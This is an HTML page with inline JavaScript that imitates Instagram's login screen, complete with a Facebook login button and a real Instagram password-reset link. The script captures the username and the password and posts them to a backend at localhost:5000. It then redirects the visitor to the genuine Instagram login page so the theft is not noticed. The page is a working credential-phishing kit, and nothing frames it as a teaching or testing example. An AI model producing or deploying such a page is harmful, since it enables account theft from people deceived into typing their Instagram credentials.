  <body>
    <div class="container">
    <div class="login-box">

      <img src="image.png" id="img" alt="">

       <form id="contactForm">
      <label>
        <input type="text" name="name" placeholder="Phone number, username, or email" required />
      </label>
      <br /><br />
      <label>
        <input type="email" name="email" placeholder="password" required />
      </label>
      <br /><br />
      <button type="submit" class="login-btn" onclick="goTo()">Login in </button>
    </form>


        <div class="divider">
            <span>OR</span>
        </div>

        <button class="fb-btn">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png">
            <span>Log in with Facebook</span>
        </button>

        <a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="forgot">Forgot password?</a>
    </div>

    <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
    </div>
</div>

    <script>
      const form = document.getElementById("contactForm");
      function goTo() {
           window.location.href = " https://www.instagram.com/accounts/login/?hl=en";
        }
      form.addEventListener("submit", async function (e) {
        e.preventDefault(); // stop default form submit (page reload)

        // Get values from the form
        const formData = new FormData(form);
        const data = {
          name: formData.get("name"),
          email: formData.get("email"),
        };

        try {
          const res = await fetch("http://localhost:5000/api/form", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(data),
          });

          const result = await res.json();

          if (res.ok) {
            console.log("data successfully sent ")
            form.reset();
          } else {
            console.log("data not sent ")
          }
        } catch (err) {
          console.error(err);

        }
      });
    </script>
